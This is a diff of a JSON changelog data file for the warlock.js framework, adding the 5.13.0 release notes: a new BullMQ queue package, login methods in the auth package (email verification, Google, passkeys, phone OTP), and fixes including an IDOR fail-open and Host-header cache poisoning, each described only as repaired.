@@ -98,6 +98,10 @@
       "slug": "notifications"
     },
     {
+      "name": "@warlock.js/queue",
+      "slug": "queue"
+    },
+    {
       "name": "@warlock.js/scheduler",
       "slug": "scheduler"
     },
@@ -115,6 +119,540 @@
     }
   ],
   "releases": [
+    {
+      "version": "5.13.0",
+      "id": "v5-13-0",
+      "date": "September 17, 2026",
+      "isUnreleased": false,
+      "summaryHtml": "<code>@warlock.js/queue</code> ships as a new package (durable BullMQ + Redis background jobs, <code>defineJob</code>, <code>queueConnector()</code>, a bull-board dashboard and a notifications dispatcher). <code>@warlock.js/auth</code> adds email verification, password reset, and login with Google, passkeys and phone OTP, with account linking via a new <code>provider_accounts</code> table. <code>@warlock.js/access</code> makes ABAC <code>strictPolicies</code> deny-by-default (BREAKING) to close a fail-open IDOR path. <code>@warlock.js/web</code> fixes a Host-header cache-poisoning gap in the server page cache key (BREAKING) and a stale-Suspense-fallback replay on cache HIT, and adds <code>linkStylesheetsFor</code> for lazily-imported per-tenant themes. <code>@warlock.js/core</code> adds <code>warlock add queue</code>/<code>warlock add auth-google</code>/<code>warlock add auth-passkeys</code> installers and typed translation-key generation, and drops its dependency on <code>@warlock.js/auth</code>. Lockstep release across all 28 packages. Generator matrix ran <code>subset</code> scope (<code>baseline</code>, <code>web</code>, <code>queue</code>, <code>access</code>, <code>auth-google</code>, <code>auth-passkeys</code> rows) against the staged candidate, authorised by Hasan on 2026-09-16: \"You've my approval for whatever decision you may need to take in this release.\"",
+      "matrix": "subset",
+      "matrixRows": [
+        "baseline",
+        "web",
+        "queue",
+        "access",
+        "auth-google",
+        "auth-passkeys"
+      ],
+      "mode": "detail",
+      "packages": [
+        {
+          "name": "@warlock.js/queue",
+          "slug": "queue",
+          "total": 9,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 8
+            },
+            {
+              "type": "Fixed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "New package: durable background jobs on BullMQ + Redis. Redis is required."
+            },
+            {
+              "type": "Added",
+              "html": "<code>defineJob({ name, queue, attempts, backoff, removeOnComplete, removeOnFail, handle(payload, ctx) })</code> returns a typed job with <code>dispatch(payload, { delay, priority, jobId, attempts, backoff })</code> and <code>find(id)</code>."
+            },
+            {
+              "type": "Added",
+              "html": "Job context: <code>id</code>, <code>name</code>, <code>queue</code>, <code>attempt</code>, <code>maxAttempts</code>, <code>progress(value)</code>, <code>log(line)</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>failedJobs({ queue, start, end })</code> and <code>retryFailedJob(id, { queue })</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>queueConnector()</code> for <code>warlock.config.ts &gt; connectors</code>: reads the <code>queue</code> config key, starts workers in the app process (turn off with <code>workers.enabled: false</code>), and on shutdown waits for active jobs up to <code>workers.shutdownTimeout</code> before closing."
+            },
+            {
+              "type": "Added",
+              "html": "<code>setQueueConfig</code>, <code>startWorkers</code>, <code>closeQueue</code> for scripts, tests and worker-only processes."
+            },
+            {
+              "type": "Added",
+              "html": "<code>@warlock.js/queue/notifications</code>: <code>queueNotificationDispatcher()</code> sends <code>@warlock.js/notifications</code> <code>.queue()</code> deliveries through BullMQ, with retries and <code>delay</code> support."
+            },
+            {
+              "type": "Added",
+              "html": "<code>queueDashboard(server, { basePath })</code>: mounts bull-board on Warlock's Fastify server. <code>@bull-board/api</code> and <code>@bull-board/fastify</code> are optional peers, loaded only when it is called; a missing one throws <code>QueueDashboardDependencyError</code>."
+            },
+            {
+              "type": "Fixed",
+              "html": "Portable <code>typecheck</code> script: runs against this package's own <code>typescript</code> devDependency instead of relying on a hoisted binary from elsewhere in the workspace."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/auth",
+          "slug": "auth",
+          "total": 14,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 12
+            },
+            {
+              "type": "Fixed",
+              "n": 1
+            },
+            {
+              "type": "Security",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "<strong>Email verification and password reset.</strong> <code>sendEmailVerification(user)</code>, <code>verifyEmail(token)</code>, <code>requestPasswordReset(Model, email)</code> and <code>resetPassword(token, newPassword)</code>. Tokens are 32 random bytes, stored only as a SHA-256 hash, single-use (consumed with a conditional update, so of two concurrent uses exactly one succeeds), expiring (<code>auth.verification.expiresIn</code> default <code>\"24h\"</code>, <code>auth.passwordReset.expiresIn</code> default <code>\"60m\"</code>) and purpose-bound. A new reset request invalidates the user's earlier unused reset tokens. <code>requestPasswordReset</code> answers the same for unknown emails. <code>resetPassword</code> revokes every access token, refresh token and cookie session through <code>authService.revokeAllTokens</code>. Rejected tokens throw <code>InvalidOneTimeTokenError</code> (<code>400</code>, <code>EC008</code>)."
+            },
+            {
+              "type": "Added",
+              "html": "New <code>one_time_tokens</code> table (<code>OneTimeToken</code> model, overridable via <code>auth.oneTimeToken.model</code>), shipped in <code>authMigrations</code>. <strong>Run your migrations.</strong>"
+            },
+            {
+              "type": "Added",
+              "html": "Delivery goes through <code>@warlock.js/notifications</code>, now an <strong>optional peer dependency</strong>. Default mail notifications can be replaced via <code>auth.verification.notification</code> / <code>auth.passwordReset.notification</code>, and link builders set via <code>.url</code>. If the package is not installed or not configured, calls throw <code>NotificationsUnavailableError</code> before any token is issued."
+            },
+            {
+              "type": "Added",
+              "html": "<code>requireVerifiedEmail()</code> middleware — rejects users without <code>auth.verification.field</code> (default <code>emailVerifiedAt</code>) with <code>EmailNotVerifiedError</code> (<code>403</code>, <code>EC007</code>). <code>isEmailVerified(user)</code> helper."
+            },
+            {
+              "type": "Added",
+              "html": "<code>tokenIssueThrottleMiddleware()</code> (every request counts, per email + IP, 3/1h) and <code>tokenConsumeThrottleMiddleware()</code> (failures, per IP, 10/15m), both built on <code>loginThrottleMiddleware</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>AuthErrorCodes.EmailNotVerified</code> (<code>\"EC007\"</code>) and <code>AuthErrorCodes.InvalidOneTimeToken</code> (<code>\"EC008\"</code>)."
+            },
+            {
+              "type": "Added",
+              "html": "<strong>Login with Google, passkeys and phone codes</strong> (skill <code>login-with-providers</code>). Every method ends in the new <code>authService.completeLogin(user, deviceInfo?)</code>, which applies <code>auth.canAuthenticate</code> and then issues exactly what <code>authService.login</code> issues (same tokens, rows and <code>login.success</code> event). <code>login</code> now shares that ending. - <strong>Google:</strong> <code>startProviderLogin(response, \"google\")</code> / <code>completeProviderLogin(Model, \"google\", request, response)</code>. Uses the OIDC authorization code flow with PKCE (S256), <code>state</code> and <code>nonce</code>, kept in a signed 10-minute HttpOnly cookie. The code is exchanged with <code>fetch</code>, and the id_token is verified with <code>jose</code> against Google's JWKS (signature, <code>iss</code>, <code>aud</code>, <code>exp</code>, <code>nonce</code>). Configure it under <code>auth.providers.google</code>. Other providers implement the <code>AuthProvider</code> contract and register under <code>auth.providers.custom</code>. - <strong>Account linking:</strong> new <code>provider_accounts</code> table (<code>ProviderAccount</code>). A link always decides the user. Without one, only a provider-<strong>verified</strong> email links an existing user or creates a new one; an unverified email throws <code>ProviderEmailNotVerifiedError</code> (<code>403</code>, <code>EC010</code>). Callback rejections throw <code>InvalidProviderCallbackError</code> (<code>400</code>, <code>EC009</code>). - <strong>Passkeys:</strong> <code>generatePasskeyRegistrationOptions</code> / <code>verifyPasskeyRegistration</code> / <code>generatePasskeyAuthenticationOptions</code> / <code>verifyPasskeyAuthentication</code>, built on <code>@simplewebauthn/server</code>. Challenges are stored hashed in <code>one_time_tokens</code>, expire, and are used once (consumed even when verification fails). The request <code>Origin</code> must be in <code>auth.passkeys.origin</code>, and a signature counter that does not advance is rejected. Credentials are stored in the new <code>passkey_credentials</code> table (<code>PasskeyCredential</code>). Rejections throw <code>InvalidPasskeyError</code> (<code>400</code>, <code>EC011</code>). - <strong>Phone OTP:</strong> <code>requestOtp(Model, phone, { channel })</code> / <code>verifyOtp(Model, phone, code)</code>. Codes have 6 digits, are stored as a salted HMAC in <code>one_time_tokens</code> (purpose <code>otp</code>), expire after 5 minutes, and are invalidated after 5 attempts (counted atomically). Unknown phones get the same answer. Codes are delivered through the <code>@warlock.js/notifications</code> channel you configure (<code>auth.otp.channel</code>, default <code>\"sms\"</code>) or <code>auth.otp.send</code>; auth ships no SMS/WhatsApp driver. New <code>otpRequestThrottleMiddleware()</code> / <code>otpVerifyThrottleMiddleware()</code> presets are built on <code>loginThrottleMiddleware</code>. - <code>jose</code> and <code>@simplewebauthn/server</code> are new <strong>optional peer dependencies</strong>, loaded lazily. When one is missing, the call throws <code>AuthProviderSdkMissingError</code>, whose message names <code>warlock add auth-google</code> / <code>warlock add auth-passkeys</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>one_time_tokens</code> gains an <code>attempts</code> column, and <code>user_id</code> becomes nullable (passkey login challenges have no user yet). <code>authMigrations</code> now includes <code>ProviderAccountMigration</code> and <code>PasskeyCredentialMigration</code>. <strong>Run your migrations.</strong>"
+            },
+            {
+              "type": "Added",
+              "html": "<code>auth.cleanup</code> / <code>authService.cleanupExpiredTokens()</code> also hard-deletes expired and consumed <code>one_time_tokens</code> rows via the new <code>OneTimeToken.purgeSpent()</code>. The delete is permanent on every driver, so MongoDB's default \"trash\" strategy does not copy token hashes into <code>one_time_tokensTrash</code>."
+            },
+            {
+              "type": "Added",
+              "html": "Local real-database integration suites (<code>tests/integration/local</code>, skipped unless <code>LOCAL_MONGO_*</code> / <code>LOCAL_PG_*</code> are set) prove on MongoDB and Postgres: a one-time token consumed 20 times concurrently succeeds once, 20 concurrent wrong OTP guesses count at most 5 attempts and invalidate the code, a passkey login challenge with no user persists and is consumed, the counter compare-and-set and regression rejection hold, and <code>provider_accounts</code> allows one link per identity."
+            },
+            {
+              "type": "Added",
+              "html": "Passkey specs now also run the real <code>@simplewebauthn/server</code> against a <code>node:crypto</code> software authenticator (<code>none</code> attestation, ES256 assertions)."
+            },
+            {
+              "type": "Added",
+              "html": "<code>AuthErrorCodes.InvalidProviderCallback</code> (<code>\"EC009\"</code>), <code>AuthErrorCodes.ProviderEmailNotVerified</code> (<code>\"EC010\"</code>) and <code>AuthErrorCodes.InvalidPasskey</code> (<code>\"EC011\"</code>)."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>verifyPasskeyAuthentication</code> reported a cloned authenticator as <code>reason: \"authentication-verification-failed\"</code>, because <code>@simplewebauthn/server</code> rejects a non-advancing counter itself before auth's own check runs. It now reports <code>\"counter-regression\"</code>. The response (<code>400</code>, <code>EC011</code>) is unchanged."
+            },
+            {
+              "type": "Security",
+              "html": "<strong>Access and refresh tokens (and one-time tokens, and passkey credentials) are no longer copied into MongoDB trash collections on delete.</strong> <code>AccessToken</code>, <code>RefreshToken</code>, <code>OneTimeToken</code> and <code>PasskeyCredential</code> now declare <code>static deleteStrategy = \"permanent\"</code>, overriding the MongoDB driver's default <code>\"trash\"</code> strategy. Previously, <code>AccessToken.purgeExpired()</code>, <code>RefreshToken.purgeExpired()</code>/<code>purgeNeverExpiring()</code>, and <code>authMiddleware</code>'s expired-token cleanup all called <code>destroy()</code> without a strategy override, so on MongoDB every purge or invalidation copied the live JWT into <code>access_tokensTrash</code> / <code>refresh_tokensTrash</code> before deleting the original — leaving usable credential material behind after \"revocation\". <code>OneTimeToken.purgeSpent()</code> already forced <code>\"permanent\"</code> per-call (5.13.0 above); that override is now redundant and has been removed in favor of the model-level default. Apps that have been running on MongoDB may want to drop the <code>access_tokensTrash</code>, <code>refresh_tokensTrash</code> and <code>one_time_tokensTrash</code> collections, which may hold copies of now-revoked credentials."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/access",
+          "slug": "access",
+          "total": 2,
+          "counts": [
+            {
+              "type": "Fixed",
+              "n": 2
+            }
+          ],
+          "items": [
+            {
+              "type": "Fixed",
+              "html": "Restored the portable <code>typecheck</code> script and compile access as ESM so workspace source imports using <code>import.meta</code> are valid."
+            },
+            {
+              "type": "Fixed",
+              "html": "An unpoliced instance-level check was fail-open (allowed via the RBAC grant alone) unless <code>strictPolicies</code> was explicitly enabled, which could silently reach a resource-scoped IDOR for a forgotten <code>definePolicy</code> call. It now fails CLOSED by default; <code>strictPolicies: false</code> still restores the old fallback and warns once per permission naming the missing policy and the config key."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/web",
+          "slug": "web",
+          "total": 9,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 3
+            },
+            {
+              "type": "Fixed",
+              "n": 6
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "<code>linkStylesheetsFor(request, sourceFile)</code>: middleware or a loader declares a lazily imported module (e.g. a per-tenant theme from a static <code>import()</code> map), and the module's CSS is added to that response's render-blocking <code>&lt;head&gt;</code> links. Dev resolves it through the module graph, production through the Vite manifest. Before this, a lazy theme painted unstyled until client JS loaded its CSS. An unknown id throws <code>UnknownStylesheetSourceError</code> and a malformed id throws <code>InvalidStylesheetSourceError</code>. See the new <code>multi-theme</code> skill."
+            },
+            {
+              "type": "Added",
+              "html": "<code>route.cache.varyBy?: (request) =&gt; string</code> adds a request-derived component to the server page cache key, and a function-form <code>route.cache.tags</code> now receives <code>{ shared }</code> as its second argument, e.g. for tagging entries by theme."
+            },
+            {
+              "type": "Added",
+              "html": "<code>useTrans()</code> now accepts generated, literal translation keys. <code>warlock dev</code> augments web's <code>TranslationKeyRegistry</code> from registered <code>groupedTranslations</code> dictionaries; before generation it safely accepts <code>string</code>."
+            },
+            {
+              "type": "Fixed",
+              "html": "<strong>BREAKING:</strong> The server page cache key now includes the request <code>Host</code>. Before, two hosts (tenants) serving the same URL shared one entry, so tenant B could be served tenant A's document and <code>shared</code> payload. This also closed a Host-header cache-poisoning path."
+            },
+            {
+              "type": "Fixed",
+              "html": "The server page cache now stores the streamed document the MISS visitor received, not the synchronous <code>renderToString</code> pass. That pass rendered a not-yet-resolved <code>React.lazy</code> boundary as its Suspense fallback, so every later HIT replayed the fallback."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>warlock dev</code>: a <code>serverCache: true</code> page no longer answers 500 <code>CacheDriverNotInitializedError</code>. An app <code>resolveAlias</code> entry for a framework package made Vite ignore <code>ssr.external</code> and load a second, never-booted copy. Dev SSR now always imports <code>@warlock.js/core</code>, <code>cache</code>, <code>logger</code>, <code>context</code> and <code>cascade</code> from the instance the app booted, as production does, and drops app aliases that would re-inline an SSR-external package."
+            },
+            {
+              "type": "Fixed",
+              "html": "A page request that fails outside the page pipeline (a cache failure, a module that fails to load) is now logged to stderr as <code>[warlock:web] page request &lt;METHOD&gt; &lt;path&gt; failed: &lt;error&gt;</code>. Before, the error reached only the app's <code>error.page.tsx</code> and the server log stayed empty."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>peerDependencies.react</code> and <code>react-dom</code> tightened from <code>\"*\"</code> to <code>^19.0.0</code> — <code>web</code> is only built and tested against React 19 (see <code>devDependencies</code>), so the peer range now says so instead of accepting any major."
+            },
+            {
+              "type": "Fixed",
+              "html": "Projection no longer refuses a type-only import (<code>import type {} from \"./x\"</code>, <code>import type { X } from \"./x\"</code>, <code>import { type X } from \"./x\"</code>) as an attribution-ambiguous statement. A type-only import is erased at build and carries no runtime binding, so it can never reach the client — it was wrongly falling into the \"bare side-effect import\" refusal. A mixed import (<code>import { type A, B } from \"./x\"</code>) still has its value specifier checked exactly as before."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/core",
+          "slug": "core",
+          "total": 6,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 3
+            },
+            {
+              "type": "Changed",
+              "n": 1
+            },
+            {
+              "type": "Fixed",
+              "n": 2
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "<code>warlock add queue</code> installs <code>@warlock.js/queue</code>, generates Redis-backed <code>src/config/queue.ts</code>, and registers <code>queueConnector()</code> in <code>warlock.config.ts</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>warlock add auth-google</code> and <code>warlock add auth-passkeys</code> install <code>@warlock.js/auth</code>'s Google sign-in (<code>jose</code>) and passkey (<code>@simplewebauthn/server</code>) login methods."
+            },
+            {
+              "type": "Added",
+              "html": "<code>warlock dev</code> generates <code>.warlock/typings/translations.d.ts</code> from literal <code>groupedTranslations</code> dictionaries, augmenting web's typed translation-key registry."
+            },
+            {
+              "type": "Changed",
+              "html": "<code>warlock dev</code> now uses a 12ms quiet window for isolated file saves while extending multi-file bursts up to a 60ms maximum, reducing routine HMR latency without splitting formatter or checkout reloads."
+            },
+            {
+              "type": "Fixed",
+              "html": "Safely return no alias resolution when a configured alias has no first target."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>@warlock.js/core</code> no longer imports <code>@warlock.js/auth</code>; <code>useHashedPassword</code> now calls core's own <code>hashPassword</code> directly instead of an auth-service delegate that only called back into core, and <code>@warlock.js/auth</code> moves to a dev-only dependency. A guard spec now fails the build if any <code>core/src</code> module imports <code>@warlock.js/auth</code>."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/cascade",
+          "slug": "cascade",
+          "total": 16,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 8
+            },
+            {
+              "type": "Changed",
+              "n": 3
+            },
+            {
+              "type": "Fixed",
+              "n": 5
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "<code>Model.atomic</code>, <code>Model.findOneAndUpdate</code> and <code>Model.findAndUpdate</code> take options: <code>upsert</code>, <code>arrayFilters</code> (MongoDB), and on <code>findOneAndUpdate</code> <code>returnDocument: \"before\" | \"after\"</code> (default stays <code>\"after\"</code>). A counter or quota can now be filter + <code>$inc</code>/<code>$setOnInsert</code> + upsert, returning the new document, in one call."
+            },
+            {
+              "type": "Added",
+              "html": "Update operators <code>$setOnInsert</code> and <code>$addToSet</code>, and pipeline (array-form) updates such as <code>[{ $set: { score: { $add: [\"$likes\", \"$shares\"] } } }]</code> (MongoDB)."
+            },
+            {
+              "type": "Added",
+              "html": "<code>trustedFilter: true</code> lets a code-authored conditional filter (<code>{ used: { $lt: 10 } }</code>) through the operator-injection check on these statics. Filters are still checked by default."
+            },
+            {
+              "type": "Added",
+              "html": "Postgres upsert runs as <code>INSERT … ON CONFLICT … DO UPDATE … RETURNING *</code>. The conflict target is the primary key or a unique index whose columns are all equality keys of the filter."
+            },
+            {
+              "type": "Added",
+              "html": "<code>UnsupportedUpdateOperationError</code> (<code>operation</code>, <code>driver</code>): what a driver throws when it cannot run part of an update."
+            },
+            {
+              "type": "Added",
+              "html": "<code>.lean()</code> on the query builder: <code>get</code> / <code>first</code> / <code>paginate</code> / <code>chunk</code> return plain objects typed as the model schema (<code>LeanDocument&lt;T&gt;</code>), with no Model hydration, no driver casting and no <code>fetched</code> event. <code>static hidden</code> fields are still removed. With <code>with()</code> / <code>joinWith()</code> it throws <code>UnsupportedLeanOperationError</code>. About 1.9x faster than a hydrated read for 10k MongoDB documents."
+            },
+            {
+              "type": "Added",
+              "html": "<code>.unwind(field, { preserveNullAndEmptyArrays?, includeArrayIndex? })</code> and <code>.addFields(fields)</code> on the query builder (MongoDB). Both run in call order, so a <code>where()</code> after <code>unwind()</code> filters the elements. <code>join({ table, alias, pipeline })</code> now sends a pipeline <code>$lookup</code>."
+            },
+            {
+              "type": "Added",
+              "html": "<code>UnsupportedQueryOperationError</code> (<code>operation</code>, <code>driver</code>): the Postgres builder throws it for <code>unwind()</code> and <code>addFields()</code>, so these stages are never dropped without an error."
+            },
+            {
+              "type": "Changed",
+              "html": "<strong>BREAKING:</strong> The Postgres driver now throws <code>UnsupportedUpdateOperationError</code> for <code>$push</code> / <code>$pull</code> / <code>$addToSet</code>, pipeline updates, <code>arrayFilters</code> and unknown operators. It used to ignore <code>$push</code> / <code>$pull</code> without saying so."
+            },
+            {
+              "type": "Changed",
+              "html": "<code>Model.atomic</code> returns modified + upserted count."
+            },
+            {
+              "type": "Changed",
+              "html": "Postgres <code>findOneAndUpdate</code> picks its row with <code>SELECT … LIMIT 1 FOR UPDATE</code>, matches it by primary key and checks the filter again, so concurrent callers never go past a conditional filter."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>$dec</code> on the MongoDB driver was sent to the server as-is and rejected (\"Unknown modifier\"). It is now converted to a negative <code>$inc</code>."
+            },
+            {
+              "type": "Fixed",
+              "html": "The MongoDB pipeline parser dropped <code>$vectorSearch</code> and <code>$addFields</code> stages, so <code>similarTo()</code> ran with no vector search and no <code>score</code>. It now emits both."
+            },
+            {
+              "type": "Fixed",
+              "html": "On MongoDB, a <code>join()</code> with a <code>pipeline</code> sent a <code>$lookup</code> with no pipeline and no join fields."
+            },
+            {
+              "type": "Fixed",
+              "html": "On MongoDB, <code>joinRaw()</code> and <code>raw()</code> were silently dropped from the pipeline. <code>joinRaw(stage | stages)</code> now emits the stages verbatim in call order; <code>raw(pipeline =&gt; …)</code> receives the pipeline built so far and may return a replacement. A SQL string, a non-stage object or a non-array callback result throws <code>UnsupportedQueryOperationError</code>."
+            },
+            {
+              "type": "Fixed",
+              "html": "On MongoDB, <code>select([...]).orderBy(field)</code> did not sort when <code>field</code> was not selected, because <code>$project</code> ran before <code>$sort</code> (hydrated, lean, <code>first()</code> and <code>paginate()</code> reads). The sort now runs before the projection; sorting by a computed <code>selectRaw</code> alias still works, also mixed with unselected fields."
+            }
+          ]
+        },
+        {
+          "name": "create-warlock",
+          "slug": "create-warlock",
+          "total": 4,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 1
+            },
+            {
+              "type": "Fixed",
+              "n": 3
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "The optional-feature selector now offers Google sign-in, passkey sign-in, and durable Redis-backed BullMQ queues."
+            },
+            {
+              "type": "Fixed",
+              "html": "A <code>--db=postgres</code> scaffold shipped <code>src/config/database.ts</code> with an empty <code>clientOptions: {}</code>. Cascade's <code>PostgresPoolConfig</code> extends <code>PostgresConnectionConfig</code>, whose <code>database</code> field is required (not optional, unlike Mongo's <code>MongoClientOptions</code>), so <code>{}</code> failed <code>tsc --noEmit</code> on that exact line before a single line of app code ran. <code>templates/warlock/src/config/database.postgres.ts</code> now sets <code>database</code> inside <code>clientOptions</code> too. Verified against a real <code>npm create warlock@5.12.0 --stack=web --db=postgres --jwt</code> scaffold installed from the registry: this was the only <code>tsc</code> error once devDependencies installed correctly (see below), and it is gone after the fix. Guarded by a new static check in <code>specs/template-integrity.spec.ts</code>."
+            },
+            {
+              "type": "Fixed",
+              "html": "Investigated a separate report that a <code>--stack=web --db=postgres --jwt</code> scaffold lacked <code>@warlock.js/web</code> and <code>@types/react</code>/<code>@types/react-dom</code>. <strong>Not reproducible</strong> against the published 5.12.0 template: <code>package.json</code> lists all three correctly, and a clean install (<code>npm ci</code> with <code>NODE_ENV</code> unset) installs them. The only way to reproduce the missing <code>@types/*</code> packages was installing with <code>NODE_ENV=production</code> set, which makes npm skip <code>devDependencies</code> entirely — an environment condition on the installing machine, not a scaffold defect. No template change made for this report."
+            },
+            {
+              "type": "Fixed",
+              "html": "The scaffolded <code>User</code> model's <code>verified</code> scope queried a boolean <code>emailVerified</code> column that has never existed in the template's schema or migration. <code>@warlock.js/auth</code>'s email verification (added in 5.13.0) stamps <code>emailVerifiedAt</code> (a nullable <code>Date</code>) instead, treating \"verified\" as the field holding a value. <code>templates/warlock/src/app/users/models/user/user.model.ts</code> now declares <code>emailVerifiedAt: v.date().optional()</code> on the schema and scopes <code>verified</code> via <code>query.whereNotNull(\"emailVerifiedAt\")</code>; the user migration adds the matching nullable <code>timestamp()</code> column. Guarded by new checks in <code>specs/template-integrity.spec.ts</code>."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/ai",
+          "slug": "ai",
+          "total": 3,
+          "counts": [
+            {
+              "type": "Added",
+              "n": 2
+            },
+            {
+              "type": "Fixed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Added",
+              "html": "Scoped UTC day/month budget ledgers through <code>budget({ scoped })</code>, with an in-memory store and a lazy optional-peer cache store. Shared limits atomically reject overages with <code>ScopedBudgetExceededError</code> carrying the ledger key, window, limit, and attempted usage. Cache-backed deployment-wide enforcement requires a cache driver whose <code>update</code> primitive is cross-node atomic; Cascade storage awaits its atomic upsert API."
+            },
+            {
+              "type": "Added",
+              "html": "<code>cascadeScopedBudgetStore({ model })</code> / <code>cascadeScopedBudgetStore({ table })</code> â€” a lazy optional Cascade ledger with atomic conditional reservations. Its backing table needs a unique <code>(key, windowStart, unit)</code> index."
+            },
+            {
+              "type": "Fixed",
+              "html": "<code>@warlock.js/cache</code> marked <code>optional</code> in <code>peerDependenciesMeta</code> — every runtime import of it in <code>src</code> is <code>import type</code> (structural typing only, e.g. <code>config.ts</code>, <code>memory/*.ts</code>, <code>rag/**</code>); <code>@warlock.js/cache</code> is never required to resolve at runtime for a consumer that doesn't opt into cache-backed features. <code>@warlock.js/logger</code> stays a required (non-optional) peer: several modules (<code>config.ts</code>, <code>agent/agent.ts</code>, <code>eval/eval-runner.ts</code>, <code>workflow/engine.ts</code>, <code>planner/planner.ts</code>, <code>planner/planner-run.ts</code>, <code>supervisor/execution.ts</code>) import its <code>log</code> value statically at the top level, so the package must be resolvable at load time."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/cache",
+          "slug": "cache",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Changed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Changed",
+              "html": "Portable <code>typecheck</code> script: runs against this package's own <code>typescript</code> devDependency instead of relying on a hoisted binary from elsewhere in the workspace."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/context",
+          "slug": "context",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Changed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Changed",
+              "html": "Portable <code>typecheck</code> script: runs against this package's own <code>typescript</code> devDependency instead of relying on a hoisted binary from elsewhere in the workspace."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/fs",
+          "slug": "fs",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Changed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Changed",
+              "html": "Portable <code>typecheck</code> script: runs against this package's own <code>typescript</code> devDependency instead of relying on a hoisted binary from elsewhere in the workspace."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/herald",
+          "slug": "herald",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Changed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Changed",
+              "html": "Portable <code>typecheck</code> script: runs against this package's own <code>typescript</code> devDependency instead of relying on a hoisted binary from elsewhere in the workspace."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/logger",
+          "slug": "logger",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Fixed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Fixed",
+              "html": "Use the package-resolved TypeScript binary for type checking."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/notifications",
+          "slug": "notifications",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Fixed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Fixed",
+              "html": "Restored the portable <code>typecheck</code> script after Core's path-alias resolver was made safe for an absent first target."
+            }
+          ]
+        },
+        {
+          "name": "@warlock.js/seal",
+          "slug": "seal",
+          "total": 1,
+          "counts": [
+            {
+              "type": "Fixed",
+              "n": 1
+            }
+          ],
+          "items": [
+            {
+              "type": "Fixed",
+              "html": "Use the package-resolved TypeScript binary for type checking."
+            }
+          ]
+        }
+      ]
+    },
     {
       "version": "5.12.0",
       "id": "v5-12-0",
@@ -2755,7 +3293,7 @@
             },
             {
               "type": "Changed",
-              "html": "<strong><code>warlock add web</code> scaffolds a real, validated API endpoint</strong>, not just a static page. It now also writes <code>src/app/contact/routes.ts</code> and <code>src/app/contact/controllers/contact.controller.ts</code> (a <code>POST /api/contact</code> route validated with <code>@warlock.js/seal</code>), and <code>src/web/home.page.tsx</code> ships an interactive, localized (en/ar) contact form wired to that route via <code>@mongez/http</code> + <code>@mongez/react-form</code> + <code>@mongez/react-localization</code>. The <code>web</code> feature now also installs those three packages as dependencies."
+              "html": "<strong><code>warlock add web</code> scaffolds a real, validated API endpoint</strong>, not just a static page. It now also writes <code>src/app/contact/routes.ts</code> and <code>src/app/contact/controllers/contact.controller.ts</code> (a <code>POST /api/contact</code> route validated with <code>@warlock.js/seal</code>), and <code>src/web/home.page.tsx</code> ships an interactive, localized (en/ar) contact form wired to that route via <code>@mongez/http</code> - <code>@mongez/react-form</code> + <code>@mongez/react-localization</code>. The <code>web</code> feature now also installs those three packages as dependencies."
             },
             {
               "type": "Fixed",
@@ -2861,7 +3399,7 @@
             },
             {
               "type": "Added",
-              "html": "<strong><code>warlock add shadcn</code></strong> — sets up the prerequisites shadcn/ui expects. It is *not* a wrapper around the shadcn CLI: you still run that yourself to add components, this only makes the project ready for it."
+              "html": "<strong><code>warlock add shadcn</code></strong> — sets up the prerequisites shadcn/ui expects. It is _not_ a wrapper around the shadcn CLI: you still run that yourself to add components, this only makes the project ready for it."
             },
             {
               "type": "Changed",
@@ -2989,7 +3527,7 @@
           "items": [
             {
               "type": "Fixed",
-              "html": "<strong>The <code>warlock</code> binary was never linked in a yarn-1 scaffold.</strong> Installing the batched features under yarn 1 hit an *Invariant Violation* in yarn's linker, which aborted the install before <code>node_modules/.bin</code> was written — leaving a scaffolded project whose own <code>warlock</code> command did not exist. <code>App.pinViteResolution()</code> now writes matching <code>resolutions</code> and <code>overrides</code> entries for vite into the generated <code>package.json</code> *before* the batched feature install runs, so a single vite version is resolved and the linker completes."
